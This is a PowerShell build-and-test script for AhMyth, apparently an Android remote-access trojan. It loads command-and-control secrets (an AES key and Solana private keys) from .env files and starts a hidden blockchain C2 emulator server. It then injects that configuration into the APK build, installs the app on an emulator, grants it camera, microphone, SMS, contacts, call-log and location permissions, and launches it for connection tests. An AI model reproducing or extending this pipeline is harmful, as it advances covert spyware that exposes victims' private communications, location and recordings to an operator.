#!/usr/bin/env pwsh
<#
.SYNOPSIS
    Build APK with real blockchain config and test on emulator
.DESCRIPTION
    Reads blockchain credentials from .env files, starts emulator server,
    builds APK with blockchain mode (like Electron GUI), and runs tests
#>

param(
    [string]$DeviceId = "emulator-5556",
    [switch]$SkipBuild,
    [switch]$SkipInstall,
    [switch]$SkipTests
)

$ErrorActionPreference = "Continue"
$Script:EmulatorPid = $null

# Colors
function Write-Header($msg) { Write-Host "`n╔$('═' * ($msg.Length + 2))╗" -ForegroundColor Cyan; Write-Host "║ $msg ║" -ForegroundColor Cyan; Write-Host "╚$('═' * ($msg.Length + 2))╝" -ForegroundColor Cyan }
function Write-Step($msg) { Write-Host "[→] $msg" -ForegroundColor Yellow }
function Write-Success($msg) { Write-Host "[✓] $msg" -ForegroundColor Green }
function Write-Err($msg) { Write-Host "[✗] $msg" -ForegroundColor Red }
function Write-Info($msg) { Write-Host "[ℹ] $msg" -ForegroundColor Cyan }

# Cleanup on exit
function Cleanup {
    if ($Script:EmulatorPid) {
        Write-Info "Stopping blockchain emulator server (PID: $Script:EmulatorPid)..."
        try {
            Stop-Process -Id $Script:EmulatorPid -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
        } catch {
            # Ignore
        }
    }
}

Write-Header "AhMyth Blockchain Emulator Test (Real Credentials)"

# Step 1: Read .env files
Write-Step "Reading blockchain configuration from .env files..."
$envKeysPath = ".blockchain-keys.env"
$envContractPath = ".blockchain-contract.env"

if (-not (Test-Path $envKeysPath)) {
    Write-Err "Missing $envKeysPath"
    exit 1
}
if (-not (Test-Path $envContractPath)) {
    Write-Err "Missing $envContractPath"
    exit 1
}

# Parse .env files
function Parse-EnvFile($path) {
    $env = @{}
    Get-Content $path | ForEach-Object {
        if ($_ -match '^\s*([^#=]+)=(.*)$') {
            $key = $matches[1].Trim()
            $value = $matches[2].Trim()
            $env[$key] = $value
        }
    }
    return $env
}

$keysEnv = Parse-EnvFile $envKeysPath
$contractEnv = Parse-EnvFile $envContractPath

# Extract configuration
$rpcUrl = $keysEnv['BLOCKCHAIN_RPC_URL'] ?? $keysEnv['SOLANA_RPC_URL'] ?? 'https://api.devnet.solana.com'
$contract = $contractEnv['BLOCKCHAIN_CONTRACT_ADDRESS'] ?? $contractEnv['CONTRACT_ADDRESS']
$aesKey = $keysEnv['BLOCKCHAIN_C2_AES_KEY']
$operatorKey = $keysEnv['BLOCKCHAIN_PRIVATE_KEY']
$clientKey = $keysEnv['BLOCKCHAIN_CLIENT_PRIVATE_KEY']
$rpcFallbacks = $keysEnv['BLOCKCHAIN_RPC_FALLBACKS']

if (-not $contract) {
    Write-Err "BLOCKCHAIN_CONTRACT_ADDRESS not found in $envContractPath"
    exit 1
}
if (-not $aesKey) {
    Write-Err "BLOCKCHAIN_C2_AES_KEY not found in $envKeysPath"
    exit 1
}
if (-not $clientKey) {
    Write-Err "BLOCKCHAIN_CLIENT_PRIVATE_KEY not found in $envKeysPath"
    exit 1
}

Write-Success "Configuration loaded:"
Write-Info "  RPC URL: $rpcUrl"
Write-Info "  Contract: $contract"
Write-Info "  AES Key: $($aesKey.Substring(0, 16))..."
Write-Info "  Client Key: $($clientKey.Substring(0, 16))..."

# Step 2: Start blockchain emulator server with real credentials
if (-not $SkipTests) {
    Write-Step "Starting blockchain emulator server with real credentials..."

    # Set environment variables for emulator
    $env:BLOCKCHAIN_RPC_URL = $rpcUrl
    $env:SOLANA_RPC_URL = $rpcUrl
    $env:BLOCKCHAIN_CONTRACT_ADDRESS = $contract
    $env:SOLANA_CHANNEL_ADDRESS = $contract
    $env:BLOCKCHAIN_C2_AES_KEY = $aesKey
    $env:BLOCKCHAIN_PRIVATE_KEY = $operatorKey
    $env:BLOCKCHAIN_CLIENT_PRIVATE_KEY = $clientKey
    $env:BLOCKCHAIN_RPC_FALLBACKS = $rpcFallbacks
    $env:POLL_INTERVAL = "15000"

    # Start emulator in background
    $emulatorScript = "blockchain-emulator-server.js"
    if (-not (Test-Path $emulatorScript)) {
        Write-Err "Emulator script not found: $emulatorScript"
        exit 1
    }

    $emulatorProcess = Start-Process -FilePath "node" -ArgumentList $emulatorScript -PassThru -WindowStyle Hidden
    $Script:EmulatorPid = $emulatorProcess.Id
    Write-Success "Blockchain emulator server started (PID: $Script:EmulatorPid)"
    Start-Sleep -Seconds 3
}

# Step 3: Build APK with blockchain mode (like Electron GUI)
if (-not $SkipBuild) {
    Write-Step "Building APK with blockchain connection mode..."

    # Use the inject_blockchain.js script (mimics Electron GUI Build function)
    $factoryPath = "AhMyth-Server\app\Factory"
    if (-not (Test-Path $factoryPath)) {
        Write-Err "Factory path not found: $factoryPath"
        exit 1
    }

    # Prepare config for inject script
    $buildConfig = @{
        connectionType = "blockchain"
        rpcUrl = $rpcUrl
        contract = $contract
        aesKey = $aesKey
        clientKey = $clientKey
        chain = "solana"
        blockStep = 10
        candidates = 5
    } | ConvertTo-Json

    $configPath = Join-Path $factoryPath "blockchain-build-config.json"
    $buildConfig | Set-Content -Path $configPath

    Write-Info "  Connection Type: blockchain"
    Write-Info "  Chain: solana"
    Write-Info "  RPC: $rpcUrl"
    Write-Info "  Contract: $contract"

    # Run injection script
    $injectScript = Join-Path $factoryPath "inject_blockchain.js"
    if (Test-Path $injectScript) {
        Write-Step "Injecting blockchain config into APK..."
        & node $injectScript
        if ($LASTEXITCODE -ne 0) {
            Write-Err "Blockchain injection failed"
            Cleanup
            exit 1
        }
        Write-Success "Blockchain config injected"
    } else {
        Write-Info "No inject script found, using quick-build method..."
    }

    # Build using PowerShell quick-build script
    $quickBuildScript = Join-Path $factoryPath "quick-build.ps1"
    if (-not (Test-Path $quickBuildScript)) {
        Write-Err "Quick-build script not found: $quickBuildScript"
        Cleanup
        exit 1
    }

    Write-Step "Building APK..."
    Push-Location $factoryPath
    try {
        & $quickBuildScript
        if ($LASTEXITCODE -ne 0) {
            Write-Err "APK build failed"
            Pop-Location
            Cleanup
            exit 1
        }
    } finally {
        Pop-Location
    }

    # Find the built APK (check Factory folder first, then Output folder)
    $factoryApks = Get-ChildItem -Path $factoryPath -Filter "Ahmyth-*-aligned-debugSigned.apk" -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending
    $outputPath = "AhMyth-Server\app\Output"
    $outputApks = Get-ChildItem -Path $outputPath -Filter "Ahmyth-*-aligned-debugSigned.apk" -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending

    if ($factoryApks.Count -gt 0) {
        $apkPath = $factoryApks[0].FullName
        Write-Success "APK built: $($factoryApks[0].Name)"
        Write-Info "  Location: $apkPath"
    } elseif ($outputApks.Count -gt 0) {
        $apkPath = $outputApks[0].FullName
        Write-Success "APK found: $($outputApks[0].Name)"
        Write-Info "  Location: $apkPath"
    } else {
        Write-Err "No built APK found in $factoryPath or $outputPath"
        Cleanup
        exit 1
    }
} else {
    Write-Info "Skipping build (using existing APK)"
    $factoryPath = "AhMyth-Server\app\Factory"
    $factoryApks = Get-ChildItem -Path $factoryPath -Filter "Ahmyth-*-aligned-debugSigned.apk" -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending
    $outputPath = "AhMyth-Server\app\Output"
    $outputApks = Get-ChildItem -Path $outputPath -Filter "Ahmyth-*-aligned-debugSigned.apk" -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending

    if ($factoryApks.Count -gt 0) {
        $apkPath = $factoryApks[0].FullName
    } elseif ($outputApks.Count -gt 0) {
        $apkPath = $outputApks[0].FullName
    } else {
        Write-Err "No APK found in $factoryPath or $outputPath"
        Cleanup
        exit 1
    }
}

# Step 4: Install APK on emulator
if (-not $SkipInstall) {
    Write-Step "Installing APK on device $DeviceId..."

    # Check if device is connected
    $devices = & adb devices | Select-String -Pattern "^$DeviceId\s+device"
    if (-not $devices) {
        Write-Err "Device $DeviceId not found"
        Write-Info "Available devices:"
        & adb devices
        Cleanup
        exit 1
    }
    Write-Success "Device $DeviceId connected"

    # Uninstall old version
    Write-Step "Uninstalling previous version..."
    & adb -s $DeviceId uninstall ahmyth.mine.king.ahmyth 2>&1 | Out-Null

    # Install new APK
    Write-Step "Installing APK..."
    & adb -s $DeviceId install --no-incremental -r -d "$apkPath"
    if ($LASTEXITCODE -ne 0) {
        Write-Err "APK installation failed"
        Cleanup
        exit 1
    }
    Write-Success "APK installed"

    # Grant permissions
    Write-Step "Granting permissions..."
    $permissions = @(
        'android.permission.CAMERA',
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_CONTACTS',
        'android.permission.READ_SMS',
        'android.permission.READ_CALL_LOG',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE'
    )

    foreach ($perm in $permissions) {
        & adb -s $DeviceId shell pm grant ahmyth.mine.king.ahmyth $perm 2>&1 | Out-Null
    }
    Write-Success "Permissions granted"

    # Launch app
    Write-Step "Launching app..."
    & adb -s $DeviceId shell am start -n ahmyth.mine.king.ahmyth/.MainActivity 2>&1 | Out-Null
    Start-Sleep -Seconds 2
    Write-Success "App launched"
} else {
    Write-Info "Skipping installation"
}

# Step 5: Run tests
if (-not $SkipTests) {
    Write-Step "Waiting for client to connect (30 seconds)..."
    Start-Sleep -Seconds 30

    Write-Step "Running comprehensive tests..."
    Write-Info "  Device ID: $DeviceId"
    Write-Info "  Connection Type: blockchain"
    Write-Info "  RPC URL: $rpcUrl"
    Write-Info "  Contract: $contract"

    # Run test suite
    $testScript = "run-comprehensive-tests.ps1"
    if (-not (Test-Path $testScript)) {
        Write-Err "Test script not found: $testScript"
        Cleanup
        exit 1
    }

    & $testScript -DeviceId $DeviceId -ConnectionType blockchain -BlockchainRpcUrl $rpcUrl -BlockchainContract $contract -BlockchainAesKey $aesKey
    $testExitCode = $LASTEXITCODE

    if ($testExitCode -eq 0) {
        Write-Success "All tests passed!"
    } else {
        Write-Err "Some tests failed (exit code: $testExitCode)"
    }
} else {
    Write-Info "Skipping tests"
    Write-Info "Blockchain emulator server is running (PID: $Script:EmulatorPid)"
    Write-Info "Press Ctrl+C to stop"

    # Keep running until interrupted
    try {
        while ($true) {
            Start-Sleep -Seconds 1
        }
    } catch {
        # User interrupted
    }
}

# Cleanup
Cleanup

Write-Header "Test Complete"
exit 0
